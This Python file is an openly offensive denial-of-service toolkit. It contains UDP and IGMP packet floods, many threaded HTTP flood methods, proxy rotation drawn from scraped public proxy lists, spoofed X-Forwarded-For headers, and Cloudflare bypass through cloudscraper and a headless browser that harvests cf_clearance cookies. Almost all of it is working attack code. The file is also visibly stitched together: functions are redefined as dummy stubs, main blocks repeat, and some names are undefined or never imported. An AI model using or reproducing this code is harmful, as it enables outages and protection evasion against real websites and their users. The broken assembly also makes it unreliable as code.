import os
import threading
import requests
import sys
import cloudscraper
import datetime
import time
import socket
import socks
import ssl
import random
import httpx
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from sys import stdout
from colorama import Fore, init

# Initialize colorama
init(autoreset=True)

def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        remaining_time = (until - datetime.datetime.now()).total_seconds()
        if remaining_time > 0:
            stdout.flush()
            stdout.write(f"\r {Fore.MAGENTA}[*]{Fore.WHITE} Attack status => {remaining_time:.2f} sec left ")
        else:
            stdout.flush()
            stdout.write(f"\r {Fore.MAGENTA}[*]{Fore.WHITE} Attack Done!                                    \n")
            return

def get_target(url):
    url = url.rstrip()
    parsed_url = urlparse(url)
    target = {
        'uri': parsed_url.path if parsed_url.path else "/",
        'host': parsed_url.netloc,
        'scheme': parsed_url.scheme,
        'port': parsed_url.port if parsed_url.port else ("443" if parsed_url.scheme == "https" else "80")
    }
    return target

def get_proxylist(proxy_type):
    proxy_urls = {
        "SOCKS5": [
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all",
            "https://www.proxy-list.download/api/v1/get?type=socks5"
        ],
        "HTTP": [
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all",
            "https://www.proxy-list.download/api/v1/get?type=http"
        ]
    }

    if proxy_type in proxy_urls:
        proxies = ""
        for url in proxy_urls[proxy_type]:
            response = requests.get(url).text
            proxies += response
        proxy_file_path = f"./resources/{proxy_type.lower()}.txt"
        with open(proxy_file_path, 'w') as proxy_file:
            proxy_file.write(proxies)
        return proxies.rstrip().split('\r\n')
    return []

def get_proxies():
    global proxies
    proxy_file_path = "./proxy.txt"
    if not os.path.exists(proxy_file_path):
        stdout.write(f"{Fore.MAGENTA} [*]{Fore.WHITE} You Need Proxy File ( {proxy_file_path} )\n")
        return False
    with open(proxy_file_path, 'r') as proxy_file:
        proxies = proxy_file.read().split('\n')
    return True

# Example usage
if __name__ == "__main__":
    countdown(10)
    target = get_target("https://example.com")
    print(target)
    proxies = get_proxylist("HTTP")
    print(proxies)
    if get_proxies():
        print(proxies)

init(autoreset=True)

def get_cookie(url):
    global useragent, cookieJAR, cookie
    options = ChromeOptions()
    arguments = [
        '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
        '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maximized',
        '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en'
    ]
    for argument in arguments:
        options.add_argument(argument)

    driver = Chrome(options=options)
    driver.implicitly_wait(3)
    driver.get(url)

    for _ in range(60):
        cookies = driver.get_cookies()
        for cookie in cookies:
            if cookie['name'] == 'cf_clearance':
                cookieJAR = cookie
                useragent = driver.execute_script("return navigator.userAgent")
                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                driver.quit()
                return True
        time.sleep(1)

    driver.quit()
    return False

def spoof(target):
    addr = [random.randrange(11, 197), random.randrange(0, 255), random.randrange(0, 255), random.randrange(2, 254)]
    spoofip = '.'.join(map(str, addr))
    return (
        "X-Forwarded-Proto: Http\r\n"
        f"X-Forwarded-Host: {target['host']}, 1.1.1.1\r\n"
        f"Via: {spoofip}\r\n"
        f"Client-IP: {spoofip}\r\n"
        f"X-Forwarded-For: {spoofip}\r\n"
        f"Real-IP: {spoofip}\r\n"
    )

def get_info_l7():
    stdout.write(f"\x1b[38;2;255;20;147m • {Fore.WHITE}URL      {Fore.LIGHTCYAN_EX}: {Fore.LIGHTGREEN_EX}")
    target = input()
    stdout.write(f"\x1b[38;2;255;20;147m • {Fore.WHITE}THREAD   {Fore.LIGHTCYAN_EX}: {Fore.LIGHTGREEN_EX}")
    thread = input()
    stdout.write(f"\x1b[38;2;255;20;147m • {Fore.WHITE}TIME(s)  {Fore.LIGHTCYAN_EX}: {Fore.LIGHTGREEN_EX}")
    t = input()
    return target, thread, t

def get_info_l4():
    stdout.write(f"\x1b[38;2;255;20;147m • {Fore.WHITE}IP       {Fore.LIGHTCYAN_EX}: {Fore.LIGHTGREEN_EX}")
    target = input()
    stdout.write(f"\x1b[38;2;255;20;147m • {Fore.WHITE}PORT     {Fore.LIGHTCYAN_EX}: {Fore.LIGHTGREEN_EX}")
    port = input()
    stdout.write(f"\x1b[38;2;255;20;147m • {Fore.WHITE}THREAD   {Fore.LIGHTCYAN_EX}: {Fore.LIGHTGREEN_EX}")
    thread = input()
    stdout.write(f"\x1b[38;2;255;20;147m • {Fore.WHITE}TIME(s)  {Fore.LIGHTCYAN_EX}: {Fore.LIGHTGREEN_EX}")
    t = input()
    return target, port, thread, t

# Example usage
if __name__ == "__main__":
    url = "https://example.com"
    if get_cookie(url):
        print("Cookie obtained successfully.")
    else:
        print("Failed to obtain cookie.")

    target = get_target(url)
    spoof_header = spoof(target)
    print(spoof_header)

    l7_info = get_info_l7()
    print(l7_info)

    l4_info = get_info_l4()
    print(l4_info)

#region layer4
def run_flooder(host, port, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    rand = random._urandom(4096)
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=flooder, args=(host, port, rand, until))
            thd.start()
        except Exception as e:
            print(f"Error starting thread: {e}")

def flooder(host, port, rand, until_datetime):
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(rand, (host, int(port)))
        except Exception as e:
            print(f"Error in flooder: {e}")
            sock.close()
            break

def run_sender(host, port, th, t, payload=""):
    if not payload:
        payload = random._urandom(60000)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=sender, args=(host, port, until, payload))
            thd.start()
        except Exception as e:
            print(f"Error starting thread: {e}")

def sender(host, port, until_datetime, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(payload, (host, int(port)))
        except Exception as e:
            print(f"Error in sender: {e}")
            sock.close()
            break
#endregion

#region METHOD

#region HEAD
def launch(url, th, t, method):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thread = threading.Thread(target=globals()[f"attack_{method}"], args=(url, until))
            thread.start()
        except Exception as e:
            print(f"Error launching method {method}: {e}")

def launch_head(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=attack_head, args=(url, until))
            thd.start()
        except Exception as e:
            print(f"Error starting HEAD attack thread: {e}")

def attack_head(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.head(url)
            requests.head(url)
        except Exception as e:
            print(f"Error in attack_head: {e}")
#endregion

#endregion

# Example usage
if __name__ == "__main__":
    # Example usage of run_flooder
    run_flooder("example.com", 80, 10, 60)

    # Example usage of run_sender
    run_sender("example.com", 80, 10, 60, "payload")

    # Example usage of launch
    launch("https://example.com", 10, 60, "head")

    # Example usage of launch_head
    launch_head("https://example.com", 10, 60)

# Global variables
proxies = []

#region POST
def launch_post(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=attack_post, args=(url, until))
            thd.start()
        except Exception as e:
            print(f"Error starting POST attack thread: {e}")

def attack_post(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.post(url)
            requests.post(url)
        except Exception as e:
            print(f"Error in attack_post: {e}")
#endregion

#region RAW
def launch_raw(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=attack_raw, args=(url, until))
            thd.start()
        except Exception as e:
            print(f"Error starting RAW attack thread: {e}")

def attack_raw(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.get(url)
            requests.get(url)
        except Exception as e:
            print(f"Error in attack_raw: {e}")
#endregion

#region PXRAW
def launch_pxraw(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=attack_pxraw, args=(url, until))
            thd.start()
        except Exception as e:
            print(f"Error starting PXRAW attack thread: {e}")

def attack_pxraw(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        proxy = 'http://' + str(random.choice(proxies))
        proxy_dict = {
            'http': proxy,
            'https': proxy,
        }
        try:
            requests.get(url, proxies=proxy_dict)
            requests.get(url, proxies=proxy_dict)
        except Exception as e:
            print(f"Error in attack_pxraw: {e}")
#endregion

#region PXSOC
def launch_pxsoc(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET " + target['uri'] + " HTTP/1.1\r\n"
    req += "Host: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(user_agents) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=attack_pxsoc, args=(target, until, req))
            thd.start()
        except Exception as e:
            print(f"Error starting PXSOC attack thread: {e}")

def attack_pxsoc(target, until_datetime, req):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = random.choice(proxies).split(":")
            if target['scheme'] == 'https':
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                s.connect((str(target['host']), int(target['port'])))
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
            else:
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                s.connect((str(target['host']), int(target['port'])))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except Exception as e:
                print(f"Error sending request in attack_pxsoc: {e}")
                s.close()
        except Exception as e:
            print(f"Error in attack_pxsoc: {e}")
            return
#endregion

def get_target(url):
    # Dummy implementation; replace with actual logic
    return {
        'uri': '/',
        'host': 'example.com',
        'scheme': 'http',
        'port': '80'
    }

user_agents = [
    # List of user agents
    "Mozilla/5.0 ...",
    # Add more user agents here
]

if __name__ == "__main__":
    # Example usage of launch_post
    launch_post("https://example.com", 10, 60)

    # Example usage of launch_raw
    launch_raw("https://example.com", 10, 60)

    # Example usage of launch_pxraw
    proxies = ["1.1.1.1:8080", "2.2.2.2:8080"]  # Example proxy list
    launch_pxraw("https://example.com", 10, 60)

    # Example usage of launch_pxsoc
    launch_pxsoc("https://example.com", 10, 60)

# Global variables
proxies = []

#region SOC
def launch_soc(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = f"GET {target['uri']} HTTP/1.1\r\nHost: {target['host']}\r\n"
    req += f"User-Agent: {random.choice(user_agents)}\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=attack_soc, args=(target, until, req))
            thd.start()
        except Exception as e:
            print(f"Error starting SOC attack thread: {e}")

def attack_soc(target, until_datetime, req):
    try:
        if target['scheme'] == 'https':
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target['host']), int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target['host']), int(target['port'])))
        while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except Exception as e:
                print(f"Error sending request in attack_soc: {e}")
                s.close()
    except Exception as e:
        print(f"Error in attack_soc: {e}")
#endregion

def launch_pps(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=attack_pps, args=(target, until))
            thd.start()
        except Exception as e:
            print(f"Error starting PPS attack thread: {e}")

def attack_pps(target, until_datetime):
    try:
        if target['scheme'] == 'https':
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target['host']), int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target['host']), int(target['port'])))
        while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
            try:
                for _ in range(100):
                    s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
            except Exception as e:
                print(f"Error sending request in attack_pps: {e}")
                s.close()
    except Exception as e:
        print(f"Error in attack_pps: {e}")
#endregion

def launch_null(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = f"GET {target['uri']} HTTP/1.1\r\nHost: {target['host']}\r\n"
    req += "User-Agent: null\r\n"
    req += "Referrer: null\r\n"
    req += spoof(target) + "\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=attack_null, args=(target, until, req))
            thd.start()
        except Exception as e:
            print(f"Error starting NULL attack thread: {e}")

def attack_null(target, until_datetime, req):
    try:
        if target['scheme'] == 'https':
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target['host']), int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target['host']), int(target['port'])))
        while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except Exception as e:
                print(f"Error sending request in attack_null: {e}")
                s.close()
    except Exception as e:
        print(f"Error in attack_null: {e}")
#endregion

def launch_spoof(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = f"GET {target['uri']} HTTP/1.1\r\nHost: {target['host']}\r\n"
    req += f"User-Agent: {random.choice(user_agents)}\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
    req += spoof(target)
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=attack_spoof, args=(target, until, req))
            thd.start()
        except Exception as e:
            print(f"Error starting SPOOF attack thread: {e}")

def attack_spoof(target, until_datetime, req):
    try:
        if target['scheme'] == 'https':
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target['host']), int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target['host']), int(target['port'])))
        while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except Exception as e:
                print(f"Error sending request in attack_spoof: {e}")
                s.close()
    except Exception as e:
        print(f"Error in attack_spoof: {e}")
#endregion

def get_target(url):
    # Dummy implementation; replace with actual logic
    return {
        'uri': '/',
        'host': 'example.com',
        'scheme': 'http',
        'port': '80'
    }

def spoof(target):
    # Dummy implementation; replace with actual logic
    return "X-Forwarded-For: 1.1.1.1"

user_agents = [
    # List of user agents
    "Mozilla/5.0 ...",
    # Add more user agents here
]

if __name__ == "__main__":
    # Example usage of launch_soc
    launch_soc("https://example.com", 10, 60)

    # Example usage of launch_pps
    launch_pps("https://example.com", 10, 60)

    # Example usage of launch_null
    launch_null("https://example.com", 10, 60)

    # Example usage of launch_spoof
    launch_spoof("https://example.com", 10, 60)

def LaunchPXSPOOF(url, th, t, proxy):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET " + target['uri'] + " HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += spoof(target)
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            randomproxy = random.choice(proxy)
            thd = threading.Thread(target=AttackPXSPOOF, args=(target, until, req, randomproxy))
            thd.start()
        except:
            pass

def AttackPXSPOOF(target, until_datetime, req, proxy): #
    proxy = proxy.split(":")
    print(proxy)
    try:
        if target['scheme'] == 'https':
            s = socks.socksocket()
            #s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            s.connect((str(target['host']), int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            #s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            s.connect((str(target['host']), int(target['port'])))
    except:
        return
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass

#region CFB
def LaunchCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
            scraper.get(url, timeout=15)
        except:
            pass
#endregion

#region PXCFB
def LaunchPXCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackPXCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = {
                'http': 'http://'+str(random.choice(list(proxies))),
                'https': 'http://'+str(random.choice(list(proxies))),
            }
            scraper.get(url, proxies=proxy)
            scraper.get(url, proxies=proxy)
        except:
            pass
#endregion

#region CFPRO
def LaunchCFPRO(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session = requests.Session()
    scraper = cloudscraper.create_scraper(sess=session)
    jar = RequestsCookieJar()
    jar.set(cookieJAR['name'], cookieJAR['value'])
    scraper.cookies = jar
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFPRO, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFPRO(url, until_datetime, scraper):
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url=url, headers=headers, allow_redirects=False)
            scraper.get(url=url, headers=headers, allow_redirects=False)
        except:
            pass
#endregion

#region CFSOC
def LaunchCFSOC(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target = get_target(url)
    req =  'GET ' + target['uri'] + ' HTTP/1.1\r\n'
    req += 'Host: ' + target['host'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    req += 'Cookie: ' + cookie + '\r\n'
    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: empty\r\n'
    req += 'sec-fetch-mode: cors\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: ' + useragent + '\r\n\r\n\r\n'
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFSOC, args=(until, target, req,))
            thd.start()
        except:  
            pass

def AttackCFSOC(until_datetime, target, req):
    if target['scheme'] == 'https':
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
    else:
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(10):
                packet.send(str.encode(req))
        except:
            packet.close()
            pass
#endregion

#region testzone
def attackSKY(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchSKY, args=(url, timer)).start()

def LaunchSKY(url, timer):
    proxy = random.choice(proxies).strip().split(":")
    timelol = time.time() + int(timer)
    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socks.socksocket()
            s.connect((str(urlparse(url).netloc), int(443)))
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()

def attackSTELLAR(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchSTELLAR, args=(url, timer)).start()

def LaunchSTELLAR(url, timer):
    timelol = time.time() + int(timer)
    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(urlparse(url).netloc), int(443)))
            ctx = ssl.create_default_context()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()
#endregion

ua = [
    # List of user agents
]

proxies = [
    # List of proxies
]

def LaunchHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackHTTP2, args=(url, until)).start()

def AttackHTTP2(url, until_datetime):
    headers = {
        'User-Agent': random.choice(ua),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    client = httpx.Client(http2=True)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client.get(url, headers=headers)
            client.get(url, headers=headers)
        except:
            pass

def LaunchPXHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackPXHTTP2, args=(url, until)).start()

def AttackPXHTTP2(url, until_datetime):
    headers = {
        'User-Agent': random.choice(ua),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client = httpx.Client(
                http2=True,
                proxies={
                    'http://': 'http://' + random.choice(proxies),
                    'https://': 'http://' + random.choice(proxies),
                }
            )
            client.get(url, headers=headers)
            client.get(url, headers=headers)
        except:
            pass

def test1(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target = get_target(url)
    req = 'GET ' + target['uri'] + ' HTTP/1.1\r\n'
    req += 'Host: ' + target['host'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    # req += 'Cookie: ' + cookie + '\r\n'  # Uncomment if needed
    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: empty\r\n'
    req += 'sec-fetch-mode: cors\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en\r\n\r\n\r\n'
    for _ in range(int(th)):
        try:
            threading.Thread(target=test2, args=(until, target, req,)).start()
        except:
            pass

def test2(until_datetime, target, req):
    if target['scheme'] == 'https':
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
    else:
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(10):
                packet.send(str.encode(req))
        except:
            packet.close()
            pass

def clear():
    if name == 'nt':
        system('cls')
    else:
        system('clear')

##############################################################################################
def help():
    clear()
